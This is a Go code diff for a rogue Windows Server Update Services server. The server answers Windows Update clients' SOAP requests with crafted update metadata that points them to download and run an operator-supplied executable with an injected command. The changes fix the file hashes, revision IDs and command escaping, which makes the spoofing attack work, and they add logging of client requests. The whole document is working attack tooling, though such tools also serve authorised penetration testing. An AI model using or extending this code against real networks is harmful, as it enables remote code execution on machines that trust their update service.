@@ -1,16 +1,20 @@
 package main
 
 import (
+	"bytes"
 	"crypto/sha1"
 	"crypto/sha256"
 	"encoding/base64"
 	"fmt"
+	"html"
+	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 
@@ -26,10 +30,6 @@ var getExtendedUpdateInfoXml string
 var reportEventBatchXml string
 var getAuthorizationCookieXml string
 
-var revisionIds []string = []string{string(999999 - rand.Intn(99999)), string(999999 - rand.Intn(99999))}
-var deploymentIds []string = []string{string(99999 - rand.Intn(19999)), string(99999 - rand.Intn(19999))}
-
-var executableFile *os.File
 var executeCommand string
 var filePath string
 var serverAddress string
@@ -42,6 +42,11 @@ var opts struct {
 	Command    []string `short:"c" long:"command" description:"The parameters for the current executable." required:"true"`
 }
 
+func getSHA256Binary(s []byte) []byte {
+	r := sha256.Sum256(s)
+	return r[:]
+}
+
 func setResourcesXml() {
 	var f []byte
 	u1, _ := uuid.NewRandom()
@@ -49,10 +54,16 @@ func setResourcesXml() {
 	u3, _ := uuid.NewRandom()
 
 	ef, _ := ioutil.ReadFile(filePath)
-	sha1Str := string(sha1.New().Sum(ef))
-	sha256Str := string(sha256.New().Sum(ef))
-	fileSize := string(len(ef))
-	fileName := filepath.Base(filePath)
+	hash1 := sha1.Sum(ef)
+	sha1Str := base64.StdEncoding.EncodeToString(hash1[:])
+	hash256 := sha256.Sum256(ef)
+	sha256Str := base64.StdEncoding.EncodeToString(hash256[:])
+
+	var revisionIds []string = []string{strconv.Itoa(999999 - rand.Intn(99999)), strconv.Itoa(999999 - rand.Intn(99999))}
+	var deploymentIds []string = []string{strconv.Itoa(99999 - rand.Intn(19999)), strconv.Itoa(99999 - rand.Intn(19999))}
+
+	fileSize := strconv.Itoa(len(ef))
+	fileName := filepath.Base(filePath) + ".exe"
 	fileDownloadURL := "http://" + serverAddress + ":" + serverPort + "/" + u3.String() + "/" + fileName
 
 	lastChangeDate := time.Now().Add(time.Duration(24) * time.Hour * -3).Format(time.RFC3339)
@@ -73,11 +84,12 @@ func setResourcesXml() {
 		"{deployment_id1}", deploymentIds[0], "{deployment_id2}", deploymentIds[1],
 		"{uuid1}", u1.String(), "{uuid2}", u2.String(),
 		"{expire}", expireDate, "{cookie}", cookieValue).Replace(string(f))
+	fmt.Println(revisionIds)
 
 	f, _ = ioutil.ReadFile("./resources/get-extended-update-info.xml")
 	getExtendedUpdateInfoXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
 		"{sha1}", sha1Str, "{sha256}", sha256Str, "{filename}", fileName,
-		"{file_size}", fileSize, "{command}", executeCommand, "{url}", fileDownloadURL).Replace(string(f))
+		"{file_size}", fileSize, "{command}", html.EscapeString(html.EscapeString(executeCommand)), "{url}", fileDownloadURL).Replace(string(f))
 
 	f, _ = ioutil.ReadFile("./resources/report-event-batch.xml")
 	reportEventBatchXml = string(f)
@@ -100,7 +112,7 @@ func wsusBaseServer() {
 	setResourcesXml()
 
 	http.HandleFunc("/", rootHandler)
-	fmt.Printf("Starting server...")
+	fmt.Printf("Starting server...\n")
 
 	if err := http.ListenAndServe(":"+serverPort, nil); err != nil {
 		log.Fatal("Server Run Failed.: ", err)
@@ -115,11 +127,13 @@ func doHeadOrGet(w http.ResponseWriter, r *http.Request) {
 	if strings.Contains(r.RequestURI, ".exe") {
 		w.Header().Set("Content-type", "application/octet-stream")
 		if r.Method == "GET" {
+			fmt.Printf("GET request,\nPath: %s\n", r.RequestURI)
 			ef, _ := ioutil.ReadFile(filePath)
 			w.WriteHeader(http.StatusOK)
 			w.Write(ef)
 		} else {
 			//if Header is HEAD
+			fmt.Printf("HEAD request,\nPath: %s\n", r.RequestURI)
 			w.WriteHeader(http.StatusOK)
 			w.Write(nil)
 		}
@@ -132,8 +146,11 @@ func doHeadOrGet(w http.ResponseWriter, r *http.Request) {
 }
 
 func doPost(w http.ResponseWriter, r *http.Request) {
-	soapAction := r.Header["SOAPAction"][0]
+	soapAction := r.Header["Soapaction"][0]
 	w.Header().Set("Content-type", "application/xml")
+	bodyBuf := new(bytes.Buffer)
+	io.Copy(bodyBuf, r.Body)
+	fmt.Printf("POST request,\nPath: %s\nHeader: %s\nBody: %s\n", r.RequestURI, r.Header, bodyBuf)
 
 	if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig\"" {
 		w.WriteHeader(http.StatusOK)
